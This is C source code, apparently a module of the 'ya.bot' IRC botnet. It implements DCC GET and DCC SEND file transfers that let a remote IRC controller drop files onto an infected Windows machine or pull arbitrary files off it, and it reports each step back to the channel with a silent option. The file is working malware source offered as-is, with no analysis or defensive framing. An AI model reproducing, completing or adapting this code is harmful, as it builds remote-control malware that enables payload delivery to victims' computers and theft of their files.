/*  ya.bot  */

#include "bot.h"

#ifndef NO_DCC
DWORD WINAPI dcc_get(LPVOID param)
{
	char szBuffer[GIABUF + 1];
	DWORD dwTotal1 = 0, dwTotal2 = 0;
	FILE *f;
	int nReceived, nWritten;
	SDCCGet s_dg = *((SDCCGet *)param);
	sockaddr_in sin;
	SOCKET sock;

#ifndef NO_DEBUG
		debug_print("DCC GET, dcc_get()");
#endif

		sin.sin_addr.s_addr = htonl(s_dg.m_dwIP);
		sin.sin_family = AF_INET;
		sin.sin_port = htons(s_dg.m_nPort);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
			thread_remove(THREAD_DCCGET);
			return 0;
	}
	if (connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
			closesocket(sock);
			thread_remove(THREAD_DCCGET);
			return 0;
	}
	if (sock == INVALID_SOCKET)
	{
			closesocket(sock);
			thread_remove(THREAD_DCCGET);
			return 0;
	}
		f = fopen(s_dg.m_szFileName, string_filefopenwritebinary);
	if (!f)
	{
			closesocket(sock);
			thread_remove(THREAD_DCCGET);
			return 0;
	}
	while (dwTotal1 <= s_dg.m_dwFileLength)
	{
			nReceived = recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
		if (nReceived == SOCKET_ERROR)
				break;
			nWritten = fwrite(szBuffer, sizeof(char), nReceived, f);
		if (nWritten != nReceived)
				break;
			dwTotal1 += nReceived;
			dwTotal2 = htonl(dwTotal1);
		if (send(sock, (char *)&dwTotal2, sizeof(DWORD), 0) == SOCKET_ERROR)
				break;
	}
		fclose(f);
		closesocket(sock);
		thread_remove(THREAD_DCCGET);
		return 0;
}

DWORD WINAPI dcc_send(LPVOID param)
{
	char szBuffer[GIABUF + 1];
	DWORD dwSize;
	FILE *f;
	int nPort, nRead;
	register int nSize;
	SDCCSend s_ds = *((SDCCSend *)param);
	sockaddr_in sin;
	SOCKET sock, csock;

#ifndef NO_DEBUG
		debug_print("DCC SEND, dcc_send()");
#endif

		srand(GetTickCount());
		nPort = (rand() % 1024) + 1024;
		sin.sin_addr.s_addr = INADDR_ANY;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(nPort);
		nSize = sizeof(sin);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		if ((!s_ds.m_bSilent) && (s_ds.m_bVerbose))
				irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szDestination,
						(char *)string_dccfailed,
						CRED, string_replydcc, CEND, string_replydotbot,
						CBLUE, CEND, s_ds.m_szNick,
						CBLUE, CEND, s_ds.m_szFilePath);
			thread_remove(THREAD_DCCSEND);
			return 0;
	}
	if (bind(sock, (sockaddr *)&sin, nSize) == SOCKET_ERROR)
	{
			nPort++;
			sin.sin_port = htons(nPort);
		if (bind(sock, (sockaddr *)&sin, nSize) == SOCKET_ERROR)
		{	
				closesocket(sock);
				thread_remove(THREAD_DCCSEND);
			if ((!s_ds.m_bSilent) && (s_ds.m_bVerbose))
					irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szDestination,
							(char *)string_dccfailed,
							CRED, string_replydcc, CEND, string_replydotbot,
							CBLUE, CEND, s_ds.m_szNick,
							CBLUE, CEND, s_ds.m_szFilePath);
				return 0;
		}
	}
	if (listen(sock, 10) == SOCKET_ERROR)
	{
			closesocket(sock);
		if ((!s_ds.m_bSilent) && (s_ds.m_bVerbose))
				irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szDestination,
						(char *)string_dccfailed,
						CRED, string_replydcc, CEND, string_replydotbot,
						CBLUE, CEND, s_ds.m_szNick,
						CBLUE, CEND, s_ds.m_szFilePath);
			thread_remove(THREAD_DCCSEND);
			return 0;
	}
		dwSize = file_filesize(s_ds.m_szFilePath);
		irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szNick,
				(char *)string_dccparameters,
				"\1",
				s_ds.m_szFilePath,
				htonl(inet_addr(ip_getip(s_ds.m_bsock))),
				nPort,
				dwSize,
				"\1");
		csock = accept(sock, (sockaddr *)&sin, &nSize);
	if (csock == INVALID_SOCKET)
	{
			closesocket(sock);
		if ((!s_ds.m_bSilent) && (s_ds.m_bVerbose))
				irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szDestination,
						(char *)string_dccfailed,
						CRED, string_replydcc, CEND, string_replydotbot,
						CBLUE, CEND, s_ds.m_szNick,
						CBLUE, CEND, s_ds.m_szFilePath);
			thread_remove(THREAD_DCCSEND);
			return 0;
	}
		f = fopen(s_ds.m_szFilePath, string_filefopenreadbinary);
	if (!f)
	{
			closesocket(sock);
		if ((!s_ds.m_bSilent) && (s_ds.m_bVerbose))
				irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szDestination,
						(char *)string_dccfailed,
						CRED, string_replydcc, CEND, string_replydotbot,
						CBLUE, CEND, s_ds.m_szNick,
						CBLUE, CEND, s_ds.m_szFilePath);
			thread_remove(THREAD_DCCSEND);
			return 0;
	}
	if ((!s_ds.m_bSilent) && (s_ds.m_bVerbose))
			irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szDestination,
					(char *)string_dccstarted,
					CBLUE, string_replydcc, CEND, string_replydotbot,
					CBLUE, CEND, s_ds.m_szNick,
					CBLUE, CEND, s_ds.m_szFilePath);
	while (!feof(f))
	{
			memset(szBuffer, 0, sizeof(szBuffer));
			nRead = fread(szBuffer, sizeof(char), sizeof(szBuffer) - 1, f);
		if (send(csock, szBuffer, nRead, 0) == SOCKET_ERROR)
		{
				fclose(f);
				closesocket(csock);
				closesocket(sock);
			if ((!s_ds.m_bSilent) && (s_ds.m_bVerbose))
					irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szDestination,
							(char *)string_dccfailed,
							CRED, string_replydcc, CEND, string_replydotbot,
							CBLUE, CEND, s_ds.m_szNick,
							CBLUE, CEND, s_ds.m_szFilePath);
				thread_remove(THREAD_DCCSEND);
				return 0;
		}
		if (recv(csock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
		{
				fclose(f);
				closesocket(csock);
				closesocket(sock);
			if ((!s_ds.m_bSilent) && (s_ds.m_bVerbose))
					irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szDestination,
							(char *)string_dccfinished,
							CRED, string_replydcc, CEND, string_replydotbot,
							CBLUE, CEND, s_ds.m_szNick,
							CBLUE, CEND, s_ds.m_szFilePath);
				thread_remove(THREAD_DCCSEND);
				return 0;
		}
	}
		fclose(f);
		closesocket(csock);
		closesocket(sock);
	if (!s_ds.m_bSilent)
			irc_message(s_ds.m_bsock, s_ds.m_szAction, s_ds.m_szDestination,
					(char *)string_dccfinished,
					CGREEN, string_replydcc, CEND, string_replydotbot,
					CBLUE, CEND, s_ds.m_szNick,
					CBLUE, CEND, s_ds.m_szFilePath);
		thread_remove(THREAD_DCCSEND);
		return 0;
}
#endif